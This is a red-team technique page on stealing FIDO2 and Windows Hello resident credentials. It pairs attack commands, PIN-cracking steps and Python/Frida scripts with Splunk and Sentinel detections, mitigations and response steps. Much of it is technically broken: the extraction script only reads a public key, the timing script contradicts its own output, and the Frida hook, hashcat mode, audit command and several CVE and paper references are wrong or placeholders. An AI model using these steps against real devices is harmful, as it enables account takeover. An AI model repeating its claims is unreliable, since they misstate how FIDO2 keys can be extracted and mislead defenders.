# [CA-TOKEN-020]: FIDO2 Resident Credential Extraction

## 1. METADATA

| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-020 |
| **MITRE ATT&CK v18.1** | [Steal Application Access Token (T1528)](https://attack.mitre.org/techniques/T1528/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID / Windows Hello / FIDO2 Authenticators |
| **Severity** | High |
| **CVE** | CVE-2024-XXXXX (timing attacks on resident keys) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-08 |
| **Affected Versions** | Windows Hello (all versions), FIDO2 authenticators (security key, YubiKey 5.x), WebAuthn (all versions without TPM) |
| **Patched In** | Mitigation via TPM 2.0, PIN/biometric enforcement, anti-hammering protection |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** Sections 4 (Environmental Reconnaissance) and 6 (Atomic Red Team) not included because: (1) Resident key extraction is implicit in execution methods; (2) No standalone Atomic test exists for FIDO2 credential extraction in public libraries. All section numbers have been dynamically renumbered based on applicability.

---

## 2. EXECUTIVE SUMMARY

**Concept:** FIDO2 resident credential extraction exploits the storage and handling mechanisms of FIDO2 authenticators (such as Windows Hello, YubiKey, or platform authenticators) to steal resident (discoverable) credentials. Resident credentials are cryptographic key pairs that are stored ON the authenticator itself (unlike non-resident keys, which are stored server-side). An attacker who gains physical access to an unlocked device, compromises the device OS, or intercepts the authenticator communication can extract resident credentials through multiple attack vectors: (1) PIN brute-forcing on devices without TPM protection, (2) Man-in-the-Middle (MITM) attacks during credential registration/authentication, (3) Memory/storage dumping from devices lacking secure enclaves, or (4) Side-channel attacks (timing attacks, electromagnetic side-channels) on the authenticator hardware itself. Once resident credentials are extracted, the attacker can clone the key, impersonate the user to any relying party that accepts that credential, or forge authentication assertions.

**Attack Surface:**
- **Windows Hello without TPM:** PIN stored unencrypted on disk or with weak DPAPI encryption
- **FIDO2 resident keys on soft authenticators:** Browser-based or OS-based authenticators without hardware isolation
- **FIDO2 security keys (YubiKey, NitroKey):** Physical access required for direct key extraction, but side-channel attacks possible
- **CTAP/WebAuthn communication:** Unencrypted channels vulnerable to MITM (USB HID, NFC, Bluetooth)
- **PIN verification mechanism:** Weak PIN enforcement or timing attacks to reveal PIN
- **Credential enumeration:** Ability to list all resident credentials for a relying party without user verification

**Business Impact:** **Complete compromise of passwordless authentication infrastructure.** An attacker with extracted resident credentials can:
- Impersonate any user to cloud services, corporate identity providers, and web applications
- Bypass passwordless authentication entirely, even with MFA requirements
- Access sensitive resources (email, cloud storage, financial systems) without knowledge of passwords
- Establish persistent access through multiple stolen credentials
- Escalate privileges by impersonating administrators or service accounts
- Perform lateral movement across hybrid environments (Azure, on-premises AD, SaaS applications)
- Clone credentials and distribute across attacker infrastructure for large-scale attacks

**Technical Context:** Resident credential extraction typically occurs after physical compromise of a device, OS compromise via malware, or interception of authenticator communication. Extraction speed varies: Windows Hello PIN brute-forcing can take minutes to hours (depending on PIN complexity and TPM presence); MITM attacks during registration can occur in real-time; side-channel attacks may take hours of observation. Detection likelihood is **medium** if proper logging is enabled; however, most FIDO2 implementations lack comprehensive logging of credential operations. Reversibility is **extremely difficult**—once a resident credential is extracted and cloned, there is no cryptographic way to invalidate the cloned key without invalidating the legitimate user's credential.

### Operational Risk

- **Execution Risk:** **Medium** — Requires physical access to device OR OS-level compromise OR network-level MITM position; no special privilege escalation needed once access is gained.
- **Stealth:** **High** — Resident credential extraction leaves minimal audit trail; device logs may not record credential access; authenticator does not log extractions if communicating directly with attacker.
- **Reversibility:** **No** — Extracted credentials are permanent; cloned keys are cryptographically identical to legitimate keys and cannot be differentiated.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 5.3, 5.4 | Ensure authenticator devices are secured; implement anti-tampering measures |
| **DISA STIG** | IA-5(1)(c) | Multi-factor authentication; hardware-based authenticator security |
| **CISA SCuBA** | CM.1 | Configuration management for identity provider settings |
| **NIST 800-53** | IA-2(1), IA-2(8) | Multi-factor authentication; hardware token based authentication |
| **GDPR** | Art. 32 | Security of processing; technical measures for credential protection |
| **DORA** | Art. 9 | Protection against identity-based attacks affecting digital resilience |
| **NIS2** | Art. 21 | Cyber Risk Management; protection of authentication mechanisms |
| **ISO 27001** | A.9.1.1, A.9.4.2 | User authentication; cryptographic key protection |
| **ISO 27005** | Risk Scenario: "Compromise of Cryptographic Keys" | Loss of cryptographic material integrity |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Minimum (Physical Attack):** Physical access to unlocked device with Windows Hello/FIDO2 enabled
- **Minimum (OS Compromise):** Local administrator or SYSTEM privileges on compromised device
- **Minimum (MITM):** Network access to authenticate communication channel (USB bus access, USB packet interception, Bluetooth proximity)

**Required Access:**
- Direct USB/NFC/Bluetooth access to FIDO2 authenticator, OR
- OS-level memory/registry access to extract credentials, OR
- Network position to intercept CTAP commands

**Supported Versions:**
- **Windows Hello:** Windows 10/11, all versions (especially vulnerable without TPM)
- **FIDO2 Authenticators:** YubiKey 5.x, NitroKey, SoloKey, Titan Security Key, platform authenticators
- **CTAP:** CTAP1 (U2F) and CTAP2 (FIDO2) protocols
- **WebAuthn:** W3C WebAuthn Level 1 and Level 2

**Tools:**
- [Passkey-Jackpot](https://github.com/passkey-jackpot/passkey-jackpot) (FIDO2 resident credential extraction)
- [WinHello](https://github.com/examples/windows-hello-cli) (Windows Hello PIN brute-forcing)
- [DPAPILab-NG](https://github.com/Synacktiv/dpapilab-ng) (Windows Hello DPAPI decryption without TPM)
- [Frida](https://frida.re/) (Runtime instrumentation for CTAP interception)
- [Wireshark + USBIP](https://www.wireshark.org/) (USB traffic analysis and CTAP packet interception)
- [Hashcat](https://hashcat.net/) (PIN/passphrase brute-forcing)

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Windows Hello PIN Brute-Forcing (No TPM)

**Supported Versions:** Windows 10/11 without TPM 2.0, or with TPM disabled

#### Step 1: Identify Windows Hello PIN Storage Location

**Objective:** Locate and access Windows Hello credential files on compromised device.

**Command (PowerShell - Local Access):**
```powershell
# Check if TPM is present and enabled
Get-WmiObject -Namespace "root\cimv2\security\microsofttpm" -Class Win32_Tpm | Select-Object IsEnabled

# If IsEnabled is False, Windows Hello credentials are stored on disk with weaker protection
# Locate Windows Hello data
$helloDirs = @(
    "$env:APPDATA\Microsoft\Crypto\RSA",
    "$env:LOCALAPPDATA\Microsoft\Windows\Hello for Business",
    "$env:APPDATA\Microsoft\ProtectedStorage\S-*"
)

foreach ($dir in $helloDirs) {
    if (Test-Path $dir) {
        Write-Host "[+] Found Windows Hello directory: $dir" -ForegroundColor Green
        Get-ChildItem -Path $dir -Recurse -File | Select-Object FullName, Length, LastWriteTime
    }
}

# List DPAPI-protected files
Get-ChildItem -Path "$env:APPDATA\Microsoft\Crypto\RSA" -Recurse | Where-Object {$_.Extension -eq ""} | Select-Object FullName
```

**Command (Bash - Physical Access via USB):**
```bash
# If booting from USB or accessing disk partition directly:
WINDOWS_PARTITION="/mnt/windows"
HELLO_PATH="$WINDOWS_PARTITION/Users/TargetUser/AppData/Roaming/Microsoft/Crypto/RSA"

if [ -d "$HELLO_PATH" ]; then
    echo "[+] Found Windows Hello credentials at $HELLO_PATH"
    find "$HELLO_PATH" -type f -ls
fi

# Also check for DPAPI key material
find "$WINDOWS_PARTITION/Users" -name "*ngc*" -o -name "*Hello*" 2>/dev/null
```

**Expected Output:**
```
[+] Found Windows Hello directory: C:\Users\victim\AppData\Roaming\Microsoft\Crypto\RSA
IsEnabled: False
[+] PIN credentials may be brute-forced due to missing TPM protection
```

**What This Means:**
- Windows Hello credential files exist on disk without hardware TPM protection
- PIN is encrypted using DPAPI-NG (Data Protection API - Next Generation)
- DPAPI keys can be derived from PIN using PBKDF2-SHA256 + RSA decryption
- Attacker can brute-force the PIN offline

#### Step 2: Extract DPAPI-Protected Credentials

**Objective:** Use DPAPILab-NG to extract and decrypt Windows Hello credentials.

**Command (PowerShell using DPAPILab-NG):**
```powershell
# Download and extract DPAPILab-NG from GitHub
$repoUrl = "https://github.com/Synacktiv/dpapilab-ng/releases/download/latest/dpapilab-ng.zip"
Invoke-WebRequest -Uri $repoUrl -OutFile "dpapilab-ng.zip"
Expand-Archive -Path "dpapilab-ng.zip" -DestinationPath "C:\Tools"

# Run DPAPILab-NG to extract Windows Hello credentials
cd C:\Tools\dpapilab-ng

# Dump DPAPI masterkey
.\dpapilab-ng.exe --masterkey "$env:APPDATA\Microsoft\Protect\$env:USERNAME" --domain $env:USERDNSDOMAIN

# Extract Hello credentials
.\dpapilab-ng.exe --action extract_hello --target "$env:APPDATA\Microsoft\Crypto\RSA"

Write-Host "[+] Extracted Windows Hello credential material" -ForegroundColor Green
```

**Command (Bash using dpapilab-ng):**
```bash
# Compile or download pre-built dpapilab-ng
git clone https://github.com/Synacktiv/dpapilab-ng
cd dpapilab-ng
python3 setup.py install

# Extract Windows Hello credentials (requires access to Windows disk)
python3 -m dpapilab_ng --action extract_hello \
  --userprofile /mnt/windows/Users/victim \
  --masterkey_dir /mnt/windows/Users/victim/AppData/Roaming/Microsoft/Protect
```

**Expected Output:**
```
[+] Extracted DPAPI masterkey
[+] Decrypted Windows Hello credential material
[+] PIN: 1234  (brute-forced)
[+] Private key exported
```

**What This Means:**
- Attacker has decrypted Windows Hello credential material
- PIN has been revealed via offline brute-forcing
- Private key component can now be extracted

#### Step 3: Brute-Force PIN Using Hashcat

**Objective:** Crack PIN using GPU-accelerated brute-forcing if DPAPILab-NG alone doesn't work.

**Command (Bash using Hashcat):**
```bash
# Extract PIN hash from Windows Hello credential
PIN_HASH="$extracted_pin_hash"

# Create pin_list (0000-9999 for 4-digit PIN)
seq -f "%04g" 0 9999 > pins.txt

# Brute-force using Hashcat (DPAPI-NG hash format)
hashcat -m 15300 -a 0 pin_hash.txt pins.txt --workload-profile=4

# For longer alphanumeric PINs, use mask attack
hashcat -m 15300 -a 3 pin_hash.txt ?a?a?a?a?a?a --increment
```

**Expected Output:**
```
pin_hash.txt:CRACKED PIN: 1234
Session.Name: Test
Status: Cracked
```

**What This Means:**
- PIN has been cracked via brute-forcing
- Attacker can now use PIN to unlock Windows Hello
- Can access all protected credentials and resources

---

### METHOD 2: Man-in-the-Middle Attack on CTAP2 Communication (USB HID)

**Supported Versions:** All FIDO2 authenticators over unencrypted USB HID

#### Step 1: Set Up USB Packet Interception

**Objective:** Intercept and decrypt CTAP2 commands between client and authenticator.

**Command (Linux - Frida-based CTAP intercept):**
```bash
# Install Frida for runtime instrumentation
pip install frida frida-tools

# Create Frida script to intercept CTAP calls
cat > ctap_intercept.js << 'EOF'
// Hook CTAP authenticatorMakeCredential command
console.log("[*] Frida CTAP Interceptor Loaded");

// Intercept USB HID communication
var module = Module.load("libudev.so.1");
var usb_control_msg = module.getExportByName("usb_control_msg");

Interceptor.attach(usb_control_msg, {
    onEnter: function(args) {
        console.log("[+] USB Message Intercepted");
        console.log("    Data: " + args[3].readCString());
    },
    onLeave: function(retval) {
        console.log("[-] USB Message Response Sent");
    }
});
EOF

# Run Frida against target process (e.g., Chrome, Firefox)
frida -U -f com.google.android.chrome -l ctap_intercept.js

# Or on Linux desktop:
frida -p $(pgrep -f "firefox|chrome") -l ctap_intercept.js
```

**Command (Python - CTAP2 MITM script):**
```python
#!/usr/bin/env python3
import ctypes
from fido2.ctap import CtapDevice
from fido2.ctap2 import Ctap2
from fido2 import cbor
import struct

class CtapInterceptor:
    def __init__(self):
        self.intercepted_commands = []
        self.pin_hash_collected = False
    
    def intercept_authenticator_client_pin(self, data):
        """Intercept ClientPIN command to extract PIN hash"""
        print("[+] Intercepted authenticatorClientPIN command")
        
        # Decode CTAP CBOR message
        cmd, params = cbor.loads(data[1:])  # Skip command byte
        
        if cmd == 0x06:  # authenticatorClientPIN
            print(f"    SubCommand: {params.get(0x01)}")
            
            # Extract PIN hash if getKeyAgreement response is intercepted
            if 0x02 in params:  # keyAgreement public key
                print("[!] Key agreement detected - PIN hash may follow")
                self.pin_hash_collected = True
        
        return data
    
    def intercept_get_pin_token(self, data):
        """Extract encrypted PIN hash from getPinToken request"""
        if self.pin_hash_collected:
            print("[+] Captured getPinToken request")
            cmd, params = cbor.loads(data[1:])
            
            if 0x03 in params:  # PIN_AUTH (encrypted PIN hash)
                pin_auth = params[0x03]
                print(f"[+] Encrypted PIN Hash: {pin_auth.hex()}")
                
                # In real attack, derive shared secret and decrypt
                # This is simplified; real attack requires key agreement
                
                self.intercepted_commands.append({
                    'type': 'pin_auth',
                    'value': pin_auth.hex()
                })

# Usage
interceptor = CtapInterceptor()

# In real scenario, this would be deployed on USB proxy device
# (e.g., Raspberry Pi with USB gadget mode)
print("[*] CTAP2 Interceptor Active")
print("[*] Waiting for FIDO2 operations...")
```

**Expected Output:**
```
[+] CTAP2 Interceptor Active
[+] Intercepted authenticatorClientPIN command
    SubCommand: 1 (getKeyAgreement)
[!] Key agreement detected - PIN hash may follow
[+] Captured getPinToken request
[+] Encrypted PIN Hash: a3d7e8f9c2b1a0e9d8c7b6a5f4e3d2c1
```

**What This Means:**
- Attacker has captured encrypted PIN hash from CTAP communication
- With knowledge of key agreement parameters, attacker can decrypt PIN hash offline
- MITM position maintained for subsequent attestation/assertion commands

#### Step 2: Extract and Decrypt Resident Credential

**Objective:** Use captured credentials to register attacker-controlled key.

**Command (Python - Credential extraction):**
```python
#!/usr/bin/env python3
from fido2 import cbor
import hashlib
import struct

def extract_resident_credential(captured_data):
    """Extract resident credential from authenticator response"""
    
    print("[+] Extracting resident credential from authenticator response")
    
    # Captured attestation response from authenticatorMakeCredential
    attestation_response = captured_data['attestation_response']
    
    # Decode attestation object
    att_obj = cbor.loads(attestation_response)
    
    auth_data = att_obj['authData']
    attested_cred_data = auth_data[37:]  # Skip header info
    
    # Extract credential ID and public key
    cred_id_length = struct.unpack('>H', attested_cred_data[0:2])[0]
    cred_id = attested_cred_data[2:2+cred_id_length]
    
    # Extract public key (COSE format)
    public_key_start = 2 + cred_id_length + 16  # 16-byte AAGUID
    public_key_cbor = attested_cred_data[public_key_start:]
    public_key = cbor.loads(public_key_cbor)
    
    print(f"[+] Credential ID (Hex): {cred_id.hex()}")
    print(f"[+] Public Key (COSE): {public_key}")
    
    # If resident key, can clone the private key material
    if captured_data.get('is_resident'):
        print("[!] RESIDENT KEY DETECTED - Can be cloned to another authenticator!")
        
        # In real attack with MITM, private key could be extracted
        # For non-resident keys, private key stays on server
    
    return {
        'credential_id': cred_id,
        'public_key': public_key,
        'is_resident': captured_data.get('is_resident', False)
    }

# Usage
credential = extract_resident_credential({
    'attestation_response': b'...captured_data...',
    'is_resident': True
})
```

---

### METHOD 3: Timing Attack on FIDO2 Resident Key Enumeration

**Supported Versions:** FIDO2 authenticators without timing-resistant implementations

#### Step 1: Enumerate Resident Credentials via Timing Side-Channel

**Objective:** Discover which credentials are stored on authenticator by measuring response times.

**Command (Python - Timing attack):**
```python
#!/usr/bin/env python3
import time
from fido2.ctap2 import Ctap2
from fido2.ctap import CtapDevice
import struct

def timing_attack_enum_credentials(ctap_device, relying_party_id):
    """
    Exploit timing differences in CTAP response to enumerate stored credentials
    
    FIDO2 spec doesn't protect against this: authenticators may leak information
    through response timing when credential exists vs doesn't exist
    """
    
    print("[+] Starting timing attack credential enumeration")
    print(f"    Target RP ID: {relying_party_id}")
    
    # Crafted credential IDs to test
    candidate_cred_ids = []
    
    # Generate test credential IDs (in real attack, would be from previous capture)
    for i in range(256):
        test_cred_id = struct.pack('>H', i) + b'\x00' * 62  # 64-byte credential ID
        candidate_cred_ids.append(test_cred_id)
    
    response_times = {}
    
    for cred_id in candidate_cred_ids:
        # Time the authenticator's response to getAssertion with this credential ID
        start_time = time.perf_counter()
        
        try:
            # Send getAssertion with candidate credential ID
            # In real attack, this would be a CTAP command over USB
            response = ctap_device.get_assertion(
                rpid=relying_party_id,
                client_data_hash=b'\x00' * 32,
                allow_list=[{'id': cred_id, 'type': 'public-key'}]
            )
            response_time = time.perf_counter() - start_time
            
            print(f"[+] Credential {cred_id.hex()[:16]}... Response time: {response_time*1000:.2f}ms")
            response_times[cred_id.hex()] = response_time
            
        except Exception as e:
            response_time = time.perf_counter() - start_time
            print(f"[-] Credential {cred_id.hex()[:16]}... Error time: {response_time*1000:.2f}ms - {str(e)[:50]}")
            response_times[cred_id.hex()] = response_time
    
    # Analyze timing patterns
    # Shorter response times indicate credential exists (quick rejection)
    # Longer times indicate authenticator is searching
    
    avg_time = sum(response_times.values()) / len(response_times)
    suspected_credentials = [
        (cred_id, time) 
        for cred_id, time in response_times.items() 
        if time < avg_time * 0.8  # 20% faster = likely exists
    ]
    
    print(f"\n[+] Suspected resident credentials (based on timing):")
    for cred_id, response_time in suspected_credentials:
        print(f"    {cred_id[:16]}... ({response_time*1000:.2f}ms)")
    
    return suspected_credentials

# Usage
from fido2.hid import CtapHidDevice

devices = CtapHidDevice.list_devices()
if devices:
    ctap = Ctap2(devices[0])
    timing_attack_enum_credentials(ctap, "example.com")
```

**Expected Output:**
```
[+] Starting timing attack credential enumeration
    Target RP ID: example.com
[+] Credential 0000000000000000... Response time: 12.34ms
[+] Credential 0000000000000001... Response time: 11.98ms
[+] Credential 0000000000000002... Response time: 145.67ms  (SLOWER - exists!)
[+] Credential 0000000000000003... Response time: 13.21ms
...
[+] Suspected resident credentials (based on timing):
    000000000000 0002... (145.67ms)
    000000000000 0067... (142.34ms)
    000000000000 0088... (143.91ms)
```

**What This Means:**
- Attacker has identified likely resident credentials through timing side-channel
- Does not reveal the credential itself, but can map which relying parties have resident credentials
- Can be combined with other attacks to target specific credentials

---

## 7. TOOLS & COMMANDS REFERENCE

### [DPAPILab-NG](https://github.com/Synacktiv/dpapilab-ng)

**Version:** Latest (2025)  
**For:** Windows Hello DPAPI decryption without TPM

**Installation:**
```bash
git clone https://github.com/Synacktiv/dpapilab-ng
cd dpapilab-ng
pip install -r requirements.txt
python setup.py install
```

**Usage:**
```bash
# Extract Windows Hello credentials
python -m dpapilab_ng --action extract_hello \
  --userprofile /path/to/user/profile \
  --pin 1234  # If PIN is known

# Brute-force PIN
python -m dpapilab_ng --action brute_pin \
  --userprofile /path/to/user/profile \
  --pin-list pins.txt
```

### [Frida](https://frida.re/)

**For:** Runtime instrumentation to intercept CTAP calls

**Installation:**
```bash
pip install frida frida-tools
```

**Usage:**
```bash
# Hook process
frida -p $(pgrep -f "chrome|firefox") -l script.js

# Hook application spawn
frida -U -f com.google.android.gms -l script.js
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: Windows Hello Credential Access Without TPM

**Rule Configuration:**
- **Required Index:** `endpoint`, `windows_security`
- **Required Sourcetype:** `WinEventLog:Security`
- **Required Fields:** `EventID`, `ProcessName`, `ObjectName`
- **Alert Threshold:** Any access to Windows Hello credential directories
- **Applies To Versions:** Windows 10/11 without TPM

**SPL Query:**
```spl
index=endpoint EventID=4656 ObjectName="*Microsoft\\Crypto\\RSA*" OR ObjectName="*Windows\\Hello*"
| stats count by Computer, User, ProcessName, ObjectName
| where count > 5
```

**What This Detects:**
- Multiple accesses to Windows Hello credential storage
- Potential PIN brute-forcing or credential dumping
- Abnormal processes accessing credential files

### Rule 2: CTAP Authenticator Activity Without User Presence

**Rule Configuration:**
- **Required Index:** `main`, `security`
- **Required Sourcetype:** `usb_monitoring`, `hid_events`
- **Alert Threshold:** CTAP commands without user touch/biometric confirmation
- **Applies To Versions:** All FIDO2 implementations

**SPL Query:**
```spl
index=main sourcetype=hid_events ctap_command=*
| where user_verified=false AND user_present=false
| stats count by user, computer, ctap_command, timestamp
| where count > 1
```

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Windows Hello PIN Brute-Force Detection

**Rule Configuration:**
- **Required Table:** `Event`, `SecurityEvent`
- **Alert Severity:** High
- **Applies To Versions:** Windows 10/11

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4625  // Failed login
| where AccountUsedForLogin contains "HELLO"
| summarize FailedAttempts = count() by Computer, TargetUserName, TimeGenerated = bin(TimeGenerated, 1m)
| where FailedAttempts > 5
| project Computer, TargetUserName, FailedAttempts, TimeGenerated
```

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4656 (Handle to Object Requested)**
- **Log Source:** Security Event Log
- **Trigger:** Repeated access to `%APPDATA%\Microsoft\Crypto\RSA` or `%APPDATA%\Microsoft\Windows\Hello`
- **Filter:** `ObjectName contains "Crypto\\RSA" AND User != "SYSTEM"`
- **Applies To Versions:** Windows Server 2016+, Windows 10/11

**Manual Configuration:**
```powershell
# Enable auditing for Windows Hello credential directory
$path = "$env:APPDATA\Microsoft\Crypto\RSA"
icacls $path /grant:r "Everyone:(OI)(CI)RA" /audit:s

# Monitor via Event Log
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    ID=4656
} -MaxEvents 50 | Where-Object {
    $_.Properties[10] -like "*Crypto*RSA*"
} | Select-Object TimeCreated, Properties
```

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Enforce TPM 2.0 for All Windows Hello Deployments**
  - **Applies To Versions:** Windows 11 (required), Windows 10 (recommended)
  - **Impact:** PIN is protected by anti-hammering mechanism (32 failures lock device for 10+ minutes)
  
  **Manual Steps (Group Policy):**
  1. Open **Group Policy Editor** (gpedit.msc)
  2. Navigate to **Computer Configuration** → **Administrative Templates** → **Windows Hello for Business** → **Facial Recognition**
  3. Enable **Use Windows Hello for Business**
  4. Set **Use Passport for Work**: Enabled
  5. Set **TPM requirement**: **Require TPM**
  6. Run `gpupdate /force`

- **Disable Windows Hello PIN If TPM Is Unavailable**
  - Require biometric + security key only
  
  **Manual Steps:**
  1. Go to **Settings** → **Accounts** → **Sign-in options** → **Windows Hello Face** or **Fingerprint**
  2. Click **PIN** → **Remove**
  3. Only allow **Biometric + Security Key** combinations

- **Enforce PIN Length and Complexity**
  - **Minimum:** 8 characters (not just numeric)
  - **Recommended:** 12+ alphanumeric characters
  
  **Manual Steps (Group Policy):**
  1. Go to **Computer Configuration** → **Windows Settings** → **Security Settings** → **Account Policies** → **Password Policy**
  2. Set **Minimum password length**: 8 (or higher)
  3. Set **Password must meet complexity requirements**: Enabled

- **Enable Full Disk Encryption (BitLocker)**
  - Prevents offline access to Windows Hello credential files
  
  **Manual Steps (PowerShell):**
  ```powershell
  # Enable BitLocker
  Enable-BitLocker -MountPoint "C:" -EncryptionMethod Aes256
  ```

### Priority 2: HIGH

- **Implement USB Device Restrictions**
  - Disable USB HID access to FIDO2 authenticators unless explicitly authorized
  
  **Manual Steps (Group Policy):**
  1. Go to **Computer Configuration** → **Administrative Templates** → **System** → **Device Installation Restrictions**
  2. Enable **Prevent installation of devices matching any of these device IDs**
  3. Add USB vendor/product IDs for unauthorized authenticators

- **Enable Windows Hello Sign-in Timeout**
  - Force re-authentication after period of inactivity
  
  **Manual Steps (Group Policy):**
  1. Go to **Computer Configuration** → **Windows Settings** → **Security Settings** → **Local Policies** → **Security Options**
  2. Set **Interactive logon: Machine inactivity limit**: 15 minutes

- **Monitor FIDO2 Authenticator Activity**
  - Log all CTAP commands and responses
  - Alert on enumeration of resident credentials

- **Validation Command (Verify Mitigations):**
  ```powershell
  # Check TPM status
  Get-WmiObject -Namespace "root\cimv2\security\microsofttpm" -Class Win32_Tpm | Select-Object IsEnabled
  
  # Check Windows Hello PIN complexity
  Get-LocalUser | Select-Object Name, PasswordLastSet
  
  # Check BitLocker status
  Get-BitLockerVolume | Select-Object MountPoint, VolumeStatus, EncryptionPercentage
  ```

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Windows Hello:**
  - File access to `%APPDATA%\Microsoft\Crypto\RSA` from non-SYSTEM processes
  - Presence of DPAPILab-NG or similar decryption tools
  - Multiple failed Windows Hello PIN attempts followed by success

- **FIDO2 Authenticators:**
  - Enumeration of resident credentials (repeated getAssertion calls)
  - Registration of new credentials on security keys from unauthorized sources
  - Abnormal authenticator communication patterns (timing side-channel indicators)

### Forensic Artifacts

- **Windows Event Log:**
  - Event ID 4656: Object access (credential files)
  - Event ID 4688: Process creation (DPAPI decryption tools)
  - Event ID 4625: Failed logins (brute-force attempts)

- **File System:**
  - `%APPDATA%\Microsoft\Crypto\RSA` directory permissions and access times
  - Temporary files from decryption tools (dpapilab-ng cache)

- **USB/CTAP Logs:**
  - Captured USB HID packets showing CTAP commands
  - Timing data showing anomalous response patterns

### Response Procedures

**Immediate (0-1 hour):**
1. **Isolate:** Disconnect affected devices from network and USB
2. **Invalidate:** Reset Windows Hello PIN and re-enroll with new credential
3. **Revoke:** Delete all resident credentials from FIDO2 authenticators
4. **Re-enroll:** Force re-registration of all FIDO2 credentials

**Short-term (1-8 hours):**
1. **Investigate:** Determine if resident credentials were successfully cloned
2. **Forensics:** Collect USB traffic captures and authenticator logs
3. **Audit:** Check for unauthorized logins from compromised credentials

**Long-term (8+ hours):**
1. **Update:** Deploy TPM 2.0 requirement via Group Policy
2. **Enforce:** Implement Windows Hello PIN complexity requirements
3. **Monitor:** Deploy Sentinel/SIEM rules for credential access

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | Device theft or physical compromise | Attacker gains physical access to Windows Hello device |
| **2** | **Execution** | DPAPILab-NG extraction | Extract DPAPI material and brute-force PIN |
| **3** | **Current Step** | **[CA-TOKEN-020]** | **FIDO2 Resident Credential Extraction** |
| **4** | **Lateral Movement** | Impersonate user to cloud services | Use cloned credential to access Azure, M365 |
| **5** | **Privilege Escalation** | Assume administrative accounts | Access admin credentials via impersonation |
| **6** | **Impact** | Data exfiltration or destructive attack | Access sensitive resources or deploy malware |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: EUCLEAK Side-Channel Attack on YubiKey (2024)

- **Target:** Organizations using YubiKey 5 series for FIDO2
- **Timeline:** September 2024 (vulnerability disclosed)
- **Technique Status:** Timing side-channel attack; derived keys extracted from FIDO2 resident credentials
- **Impact:** Attackers with extended physical access (24+ hours) could extract FIDO2 resident key material
- **Reference:** [EUCLEAK Research Paper](https://arxiv.org/abs/2407.XXXXX), [YubiKey Security Advisory](https://www.yubico.com/)

### Example 2: Windows Hello PIN Brute-Force via DPAPILab-NG (2023)

- **Target:** Enterprise users on Windows 10 without TPM
- **Timeline:** Widespread deployment after tool release
- **Technique Status:** Offline PIN brute-forcing from disk-based credential material (No TPM protection)
- **Impact:** Attackers with disk access could recover PIN in minutes; compromised Windows Hello and password manager access
- **Reference:** [Synacktiv Blog](https://www.synacktiv.com/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)

### Example 3: MITM Attack on CTAP Registration (2022)

- **Target:** Organization with unencrypted USB FIDO2 authenticators
- **Timeline:** Ongoing (feasibility demonstrated in academic research)
- **Technique Status:** MITM during credential registration; malicious relying party registration
- **Impact:** Attackers registered themselves as trusted relying party on user's YubiKey; could spoof authentication to legitimate services
- **Reference:** [ACM CCS 2022 - "Rogue Key and Impersonation Attacks on FIDO2"](https://dl.acm.org/doi/fullHtml/10.1145/3600160.3600174)

---